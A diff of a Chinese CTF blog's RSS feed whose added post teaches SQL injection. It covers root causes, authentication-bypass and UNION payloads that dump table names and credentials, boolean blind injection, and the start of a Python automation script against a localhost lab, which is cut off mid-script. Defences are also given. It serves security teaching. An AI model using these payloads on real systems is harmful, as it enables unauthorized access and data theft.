@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on mawei</title><link>https://mawei.org.cn/post/</link><description>Recent content in Posts on mawei</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><copyright>mawei-blog</copyright><lastBuildDate>Sun, 07 Jun 2026 00:00:00 +0000</lastBuildDate><atom:link href="https://mawei.org.cn/post/index.xml" rel="self" type="application/rss+xml"/><item><title>30小时教你玩转CTF</title><link>https://mawei.org.cn/p/30%E5%B0%8F%E6%97%B6%E6%95%99%E4%BD%A0%E7%8E%A9%E8%BD%ACctf/</link><pubDate>Sun, 07 Jun 2026 00:00:00 +0000</pubDate><guid>https://mawei.org.cn/p/30%E5%B0%8F%E6%97%B6%E6%95%99%E4%BD%A0%E7%8E%A9%E8%BD%ACctf/</guid><description>&lt;h1 id="web"&gt;web
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on mawei</title><link>https://mawei.org.cn/post/</link><description>Recent content in Posts on mawei</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><copyright>mawei-blog</copyright><lastBuildDate>Sat, 11 Jul 2026 00:00:00 +0000</lastBuildDate><atom:link href="https://mawei.org.cn/post/index.xml" rel="self" type="application/rss+xml"/><item><title>30小时教你玩转CTF</title><link>https://mawei.org.cn/p/30%E5%B0%8F%E6%97%B6%E6%95%99%E4%BD%A0%E7%8E%A9%E8%BD%ACctf/</link><pubDate>Sat, 11 Jul 2026 00:00:00 +0000</pubDate><guid>https://mawei.org.cn/p/30%E5%B0%8F%E6%97%B6%E6%95%99%E4%BD%A0%E7%8E%A9%E8%BD%ACctf/</guid><description>&lt;h1 id="web"&gt;web
 &lt;/h1&gt;&lt;h2 id="sql注入"&gt;SQL注入
 &lt;/h2&gt;&lt;h3 id="sql注入的起因"&gt;SQL注入的起因
 &lt;/h3&gt;&lt;p&gt;**SQL注入（SQL Injection，简称 SQLi）**的根本原因可以总结为八个字：&lt;strong&gt;数据与代码边界模糊&lt;/strong&gt;。&lt;/p&gt;
@@ -531,7 +531,544 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;&lt;strong&gt;触发时机&lt;/strong&gt;：当你执行 &lt;code&gt;new A()&lt;/code&gt; 时，PHP 引擎会自动寻找类中的 &lt;code&gt;__construct&lt;/code&gt; 方法并立即执行其中的代码。&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;应用场景&lt;/strong&gt;：通常用于初始化对象的属性、建立数据库连接或设置默认配置。&lt;/p&gt;</description></item><item><title>web（CTFshow知识点)</title><link>https://mawei.org.cn/p/webctfshow%E7%9F%A5%E8%AF%86%E7%82%B9/</link><pubDate>Sun, 26 Apr 2026 00:00:00 +0000</pubDate><guid>https://mawei.org.cn/p/webctfshow%E7%9F%A5%E8%AF%86%E7%82%B9/</guid><description>&lt;h2 id="信息搜集"&gt;信息搜集
+&lt;p&gt;&lt;strong&gt;应用场景&lt;/strong&gt;：通常用于初始化对象的属性、建立数据库连接或设置默认配置。&lt;/p&gt;
+&lt;h4 id=""&gt;
+&lt;/h4&gt;</description></item><item><title>30小时教你玩转CTF</title><link>https://mawei.org.cn/p/30%E5%B0%8F%E6%97%B6%E6%95%99%E4%BD%A0%E7%8E%A9%E8%BD%ACctf/</link><pubDate>Sat, 11 Jul 2026 00:00:00 +0000</pubDate><guid>https://mawei.org.cn/p/30%E5%B0%8F%E6%97%B6%E6%95%99%E4%BD%A0%E7%8E%A9%E8%BD%ACctf/</guid><description>&lt;h1 id="web"&gt;web
+&lt;/h1&gt;&lt;h2 id="sql注入"&gt;SQL注入
+&lt;/h2&gt;&lt;h3 id="sql注入的起因"&gt;SQL注入的起因
+&lt;/h3&gt;&lt;p&gt;**SQL注入（SQL Injection，简称 SQLi）**的根本原因可以总结为八个字：&lt;strong&gt;数据与代码边界模糊&lt;/strong&gt;。&lt;/p&gt;
+&lt;p&gt;当应用程序将用户输入的数据，直接拼接到了用于执行的 SQL 命令中时，数据库就无法分辨哪些是开发者原本写好的“控制指令”，哪些是用户输入的“纯数据”，从而导致用户输入的数据被当作 SQL 代码执行。&lt;/p&gt;
+&lt;p&gt;以下是导致 SQL 注入的具体核心原因和常见场景：&lt;/p&gt;
+&lt;h4 id="1-动态字符串拼接最直接的元凶"&gt;1. 动态字符串拼接（最直接的元凶）
+&lt;/h4&gt;&lt;p&gt;这是最常见的错误编写方式。开发者直接使用字符串相加或格式化字符串的方式，把用户提交的参数拼接到 SQL 语句中。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;开发者原本预想的正常代码：&lt;/strong&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;FROM&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;users&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;WHERE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;admin&amp;#39;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;AND&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;123&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;黑客输入的恶意数据：&lt;/strong&gt; 在用户名框输入 &lt;code&gt;admin' OR '1'='1&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;实际执行的 SQL 语句：&lt;/strong&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;FROM&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;users&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;WHERE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;admin&amp;#39;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;OR&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1&amp;#39;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;AND&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;123&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;原理：&lt;/strong&gt; 由于 &lt;code&gt;'1'='1'&lt;/code&gt; 永远成立，数据库会直接跳过密码验证，将用户数据全部泄露。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id="2-缺乏严格的输入验证与过滤"&gt;2. 缺乏严格的输入验证与过滤
+&lt;/h4&gt;&lt;p&gt;系统对用户输入的内容过于“信任”，没有在数据进入数据库之前进行合规性检查。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;没有转义特殊字符：&lt;/strong&gt; 未对单引号（&lt;code&gt;'&lt;/code&gt;）、双引号（&lt;code&gt;&amp;quot;&lt;/code&gt;）、分号（&lt;code&gt;;&lt;/code&gt;）、注释符（&lt;code&gt;--&lt;/code&gt; 或 &lt;code&gt;#&lt;/code&gt;）等 SQL 关键符号进行转义或过滤。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;未限制数据类型：&lt;/strong&gt; 例如，程序本需要一个数字类型的 &lt;code&gt;id&lt;/code&gt;（如 &lt;code&gt;SELECT * FROM articles WHERE id = 1&lt;/code&gt;），但因为没有强制检查输入是否为整数，导致攻击者可以输入 &lt;code&gt;1 UNION SELECT...&lt;/code&gt; 拼接恶意查询。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id="3-盲目信任隐藏的输入源"&gt;3. 盲目信任“隐藏”的输入源
+&lt;/h4&gt;&lt;p&gt;很多开发者只对表单中的文本输入框（如用户名、密码）做防护，却忽略了其他攻击者可以篡改的输入来源：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;URL 参数（GET 请求）：&lt;/strong&gt; 如 &lt;code&gt;?id=5&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;HTTP 请求头：&lt;/strong&gt; 如 &lt;code&gt;User-Agent&lt;/code&gt;、&lt;code&gt;Referer&lt;/code&gt;、&lt;code&gt;Cookie&lt;/code&gt; 等（这些常被用来进行日志记录或数据统计，也可能触发注入）。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;隐藏表单域或下拉菜单：&lt;/strong&gt; 攻击者可以通过浏览器开发者工具直接修改前端的 HTML 值再提交。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id="4-数据库权限过高推波助澜"&gt;4. 数据库权限过高（推波助澜）
+&lt;/h4&gt;&lt;p&gt;虽然数据库权限过高不是 SQL 注入的触发起因，但它是&lt;strong&gt;导致灾难扩大的关键原因&lt;/strong&gt;。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;如果 Web 应用程序连接数据库时，使用的是 &lt;code&gt;root&lt;/code&gt; 或 &lt;code&gt;sa&lt;/code&gt; 等超级管理员账号，一旦发生 SQL 注入，攻击者不仅能读取当前网站的数据，甚至能跨库查询、读写服务器本地文件（如使用 &lt;code&gt;LOAD_FILE()&lt;/code&gt;），或者直接执行系统命令控制整台服务器。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id="核心防御参数化查询"&gt;核心防御：参数化查询
+&lt;/h4&gt;&lt;p&gt;要彻底根治 SQL 注入，核心方法是&lt;strong&gt;参数化查询（Parameterized Queries / Prepared Statements）&lt;/strong&gt;。&lt;/p&gt;
+&lt;p&gt;在使用预编译语句时，数据库会先将 SQL 语句的结构编译好（例如：&lt;code&gt;SELECT * FROM users WHERE username = ?&lt;/code&gt;）。之后无论用户输入什么内容（哪怕输入了一整段恶意代码），数据库也只会把它当成一个&lt;strong&gt;纯字符串字面量&lt;/strong&gt;填入问号处，而绝不会将其当作指令去执行。&lt;/p&gt;
+&lt;h3 id="数据库的基本结构"&gt;数据库的基本结构
+&lt;/h3&gt;&lt;p&gt;库 A学校、B学校、…&lt;/p&gt;
+&lt;p&gt;表 1班、2班、…&lt;/p&gt;
+&lt;p&gt;列 学号、姓名、成绩&lt;/p&gt;
+&lt;p&gt;数据 101、张三、60分&lt;/p&gt;
+&lt;h3 id="联合注入"&gt;联合注入
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;联合注入（UNION-based SQL Injection）&lt;/strong&gt; 是 SQL 注入中一种非常经典且高效的攻击方式。它的核心在于利用 SQL 中的 &lt;code&gt;UNION&lt;/code&gt; 操作符，将攻击者自定义的查询结果“拼接到”原始查询结果中，从而通过原本正常的页面将数据库中的敏感信息直接“回显”出来。&lt;/p&gt;
+&lt;h4 id="1-联合注入的前提条件"&gt;1. 联合注入的前提条件
+&lt;/h4&gt;&lt;p&gt;并非所有的注入点都能使用联合注入，它通常需要满足以下两个硬性条件：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;页面有回显：&lt;/strong&gt; 网页上必须有能够显示查询结果的地方（例如：搜索结果页面、个人资料页、文章详情页等）。如果后端执行了查询但页面什么都不显示（盲注），则无法使用此方法。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;联合查询的列数必须一致：&lt;/strong&gt; &lt;code&gt;UNION&lt;/code&gt; 操作符要求前后两个查询语句具有相同的列数。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id="2-联合注入的工作流程"&gt;2. 联合注入的工作流程
+&lt;/h4&gt;&lt;p&gt;攻击者通常遵循以下三个步骤进行：&lt;/p&gt;
+&lt;h5 id="第一步判断列数order-by"&gt;第一步：判断列数（Order By）
+&lt;/h5&gt;&lt;p&gt;利用 &lt;code&gt;ORDER BY&lt;/code&gt; 来推测原 SQL 语句查询的字段数量。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;注入：&lt;code&gt;1' ORDER BY 1#&lt;/code&gt; （正常）&lt;/li&gt;
+&lt;li&gt;注入：&lt;code&gt;1' ORDER BY 2#&lt;/code&gt; （正常）&lt;/li&gt;
+&lt;li&gt;注入：&lt;code&gt;1' ORDER BY 3#&lt;/code&gt; （如果报错，说明查询的列数只有 2 列）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5 id="第二步寻找回显位"&gt;第二步：寻找回显位
+&lt;/h5&gt;&lt;p&gt;确认列数后，通过 &lt;code&gt;UNION SELECT&lt;/code&gt; 尝试在页面上定位哪个字段的内容会被展示出来。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;注入：&lt;code&gt;1' UNION SELECT 1, 2#&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;分析：&lt;/strong&gt; 如果页面上原本显示“标题”的地方变成了数字“1”，显示“内容”的地方变成了数字“2”，说明第 1 和 第 2 个字段都是可回显的。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5 id="第三步获取敏感信息"&gt;第三步：获取敏感信息
+&lt;/h5&gt;&lt;p&gt;确定了回显位后，就可以替换为真实的数据库查询语句，直接“拖取”数据。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;查询数据库名/版本：&lt;/strong&gt; &lt;code&gt;1' UNION SELECT database(), version()#&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;查询数据库中的表名：&lt;/strong&gt; &lt;code&gt;1' UNION SELECT 1, group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()#&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;查询特定表中的数据（如用户名和密码）：&lt;/strong&gt; &lt;code&gt;1' UNION SELECT username, password FROM users#&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id="3-原理解析示意"&gt;3. 原理解析示意
+&lt;/h4&gt;&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;核心逻辑：&lt;/strong&gt; 数据库将 &lt;code&gt;SELECT column1, column2 FROM original_table WHERE id = 1&lt;/code&gt; 的结果与 &lt;code&gt;SELECT 'hack_user', 'hack_pass' FROM users&lt;/code&gt; 的结果通过 &lt;code&gt;UNION&lt;/code&gt; 纵向合并，最终将拼接后的完整结果返回给了前端页面。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h4 id="4-为什么会有联合注入起因总结"&gt;4. 为什么会有联合注入？（起因总结）
+&lt;/h4&gt;&lt;p&gt;联合注入的本质依然是 &lt;strong&gt;“代码与数据边界模糊”&lt;/strong&gt;，但它进一步利用了 SQL 的高级特性：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;未校验输入数据的结构：&lt;/strong&gt; 开发者没有限制用户对 SQL 查询逻辑的改变。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;数据库信息过于透明：&lt;/strong&gt; 数据库中存在 &lt;code&gt;information_schema&lt;/code&gt; 等系统字典表，这使得攻击者可以通过 &lt;code&gt;UNION&lt;/code&gt; 轻松遍历出整个数据库的结构（表名、列名），降低了攻击门槛。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;程序反馈过于详细：&lt;/strong&gt; 页面直接输出了查询结果，甚至在发生错误时返回了详细的 SQL 错误信息，为攻击者提供了精准的“路标”。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h4 id="5-防御建议"&gt;5. 防御建议
+&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;依然是参数化查询：&lt;/strong&gt; 这是防御联合注入最有效的手段。一旦使用了预编译，&lt;code&gt;UNION&lt;/code&gt; 关键字将直接被作为普通字符串处理，无法改变 SQL 逻辑结构。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;权限最小化：&lt;/strong&gt; 确保 Web 用户仅拥有其必需的权限（例如：只读权限，或仅限特定表的增删改查），禁止其访问系统架构信息。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;屏蔽错误回显：&lt;/strong&gt; 在生产环境中关闭数据库报错提示，避免通过错误信息泄露表名、列名或数据库类型。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="布尔盲注"&gt;布尔盲注
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;布尔盲注（Boolean-based Blind SQLi）&lt;/strong&gt; 是一种当页面&lt;strong&gt;不会直接回显数据&lt;/strong&gt;，也不会直接显示错误信息，但&lt;strong&gt;会根据查询结果的真假呈现不同页面状态&lt;/strong&gt;时使用的攻击技术。&lt;/p&gt;
+&lt;p&gt;在这种情况下，攻击者无法使用 &lt;code&gt;UNION&lt;/code&gt; 来直接读取数据，只能通过“问问题”的方式，让数据库通过 &lt;code&gt;TRUE&lt;/code&gt; 或 &lt;code&gt;FALSE&lt;/code&gt; 来回答。&lt;/p&gt;
+&lt;h4 id="1-核心逻辑像玩二十个问题"&gt;1. 核心逻辑：像玩“二十个问题”
+&lt;/h4&gt;&lt;p&gt;布尔盲注的本质是&lt;strong&gt;构造逻辑判断&lt;/strong&gt;，通过观察页面上的细微差异（例如：页面是否正常加载、是否显示特定的欢迎词）来推断数据。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;如果条件为真 (TRUE)：&lt;/strong&gt; 页面正常显示。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;如果条件为假 (FALSE)：&lt;/strong&gt; 页面显示错误信息、空白页或特定的“搜索无结果”。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id="2-攻击过程演示"&gt;2. 攻击过程演示
+&lt;/h4&gt;&lt;p&gt;假设我们要猜解数据库的名字，第一个字母是什么？&lt;/p&gt;
+&lt;h5 id="第一步猜长度"&gt;第一步：猜长度
+&lt;/h5&gt;&lt;p&gt;通过 &lt;code&gt;length()&lt;/code&gt; 函数判断数据库名的长度。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;输入：&lt;code&gt;1' AND length(database()) = 1--+&lt;/code&gt; （页面异常）&lt;/li&gt;
+&lt;li&gt;输入：&lt;code&gt;1' AND length(database()) = 5--+&lt;/code&gt; （页面正常）&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;结论：&lt;/strong&gt; 数据库名长度为 5。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5 id="第二步逐位猜解字符"&gt;第二步：逐位猜解字符
+&lt;/h5&gt;&lt;p&gt;使用 &lt;code&gt;ascii()&lt;/code&gt; 和 &lt;code&gt;substr()&lt;/code&gt; 函数，配合二分法猜解每个字符的 ASCII 码值。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;尝试第一个字母的 ASCII 值是否大于 100：&lt;/strong&gt; &lt;code&gt;1' AND ascii(substr(database(), 1, 1)) &amp;gt; 100--+&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;如果页面正常：&lt;/strong&gt; 说明第一个字母的 ASCII 码大于 100。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;如果页面异常：&lt;/strong&gt; 说明第一个字母的 ASCII 码小于等于 100。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;通过不断调整范围，你可以精确地确定每一个字符的 ASCII 值，进而拼接出完整的数据库名。&lt;/p&gt;
+&lt;h4 id="3-布尔盲注的常用函数"&gt;3. 布尔盲注的常用函数
+&lt;/h4&gt;&lt;p&gt;在构造布尔盲注 Payload 时，这几个函数是“武器库”：&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;函数&lt;/th&gt;
+&lt;th&gt;作用&lt;/th&gt;
+&lt;th&gt;示例&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;substr()&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;截取字符串&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;substr(&amp;quot;security&amp;quot;, 1, 1)&lt;/code&gt; -&amp;gt; &amp;rsquo;s'&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;ascii()&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;返回字符的 ASCII 码&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;ascii('s')&lt;/code&gt; -&amp;gt; 115&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;length()&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;返回字符串长度&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;length(database())&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;if()&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;条件判断&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;if(expr1, expr2, expr3)&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h4 id="4-自动化攻击脚本编写思维"&gt;4. 自动化攻击（脚本编写思维）
+&lt;/h4&gt;&lt;p&gt;由于布尔盲注需要猜测大量字符，纯手工输入效率极低。通常我们会编写 Python 脚本来自动化请求：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;span class="lnt"&gt;14
+&lt;/span&gt;&lt;span class="lnt"&gt;15
+&lt;/span&gt;&lt;span class="lnt"&gt;16
+&lt;/span&gt;&lt;span class="lnt"&gt;17
+&lt;/span&gt;&lt;span class="lnt"&gt;18
+&lt;/span&gt;&lt;span class="lnt"&gt;19
+&lt;/span&gt;&lt;span class="lnt"&gt;20
+&lt;/span&gt;&lt;span class="lnt"&gt;21
+&lt;/span&gt;&lt;span class="lnt"&gt;22
+&lt;/span&gt;&lt;span class="lnt"&gt;23
+&lt;/span&gt;&lt;span class="lnt"&gt;24
+&lt;/span&gt;&lt;span class="lnt"&gt;25
+&lt;/span&gt;&lt;span class="lnt"&gt;26
+&lt;/span&gt;&lt;span class="lnt"&gt;27
+&lt;/span&gt;&lt;span class="lnt"&gt;28
+&lt;/span&gt;&lt;span class="lnt"&gt;29
+&lt;/span&gt;&lt;span class="lnt"&gt;30
+&lt;/span&gt;&lt;span class="lnt"&gt;31
+&lt;/span&gt;&lt;span class="lnt"&gt;32
+&lt;/span&gt;&lt;span class="lnt"&gt;33
+&lt;/span&gt;&lt;span class="lnt"&gt;34
+&lt;/span&gt;&lt;span class="lnt"&gt;35
+&lt;/span&gt;&lt;span class="lnt"&gt;36
+&lt;/span&gt;&lt;span class="lnt"&gt;37
+&lt;/span&gt;&lt;span class="lnt"&gt;38
+&lt;/span&gt;&lt;span class="lnt"&gt;39
+&lt;/span&gt;&lt;span class="lnt"&gt;40
+&lt;/span&gt;&lt;span class="lnt"&gt;41
+&lt;/span&gt;&lt;span class="lnt"&gt;42
+&lt;/span&gt;&lt;span class="lnt"&gt;43
+&lt;/span&gt;&lt;span class="lnt"&gt;44
+&lt;/span&gt;&lt;span class="lnt"&gt;45
+&lt;/span&gt;&lt;span class="lnt"&gt;46
+&lt;/span&gt;&lt;span class="lnt"&gt;47
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-Python" data-lang="Python"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="ch"&gt;#!/usr/bin/env python&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# -*- coding: utf-8 -*-&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;time&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 目标 URL 模板&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 对应：数据库名、表名、列名、数据内容&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;payload_templates&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="s2"&gt;&amp;#34;http://127.0.0.1/sqli/3.php?id=0 or ascii(substr((select database()),&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;,1))=&lt;/span&gt;&lt;span class="si"&gt;%d&lt;/span&gt;&lt;span class="s2"&gt;--+&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
